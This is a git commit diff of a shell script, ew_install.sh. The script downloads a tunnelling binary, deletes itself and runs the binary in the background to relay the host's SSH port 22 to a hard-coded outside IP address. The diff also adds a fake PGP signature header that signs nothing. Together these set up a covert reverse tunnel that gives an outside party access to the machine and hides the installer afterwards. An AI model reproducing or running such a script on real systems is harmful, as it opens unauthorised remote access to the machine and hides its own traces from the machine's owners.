216569ff5f2648ad915c66cae30d9859983be23a
aa <35945975+kingisme001@users.noreply.github.com>
2023-04-27 14:15:26 +0800

    Update ew_install.sh

--- ew_install.sh
+++ ew_install.sh
@@ -1,7 +1,15 @@
 #!/bin/bash
+<<ENDOFSIGSTART=
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+ENDOFSIGSTART=
+
+export PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin:/usr/local/sbin
+
 file=ew_for_linux64
-mkdir -p /app
-cd /app
+mkdir -p /appew
+cd /appew
+rm -rf ew_*
 if [ -f "$file" ];then
     echo "文件已存在，无需下载"
 else
@@ -16,7 +24,7 @@ wget https://raw.githubusercontent.com/kingisme001/ew/master/ew_for_linux64
     fi
 
 fi
+
 rm -rf ew_install.sh
 chmod +x ew_for_linux64
 nohup ./ew_for_linux64 -s lcx_slave -d 124.222.168.19 -e 8888 -f 127.0.0.1 -g 22 &
-
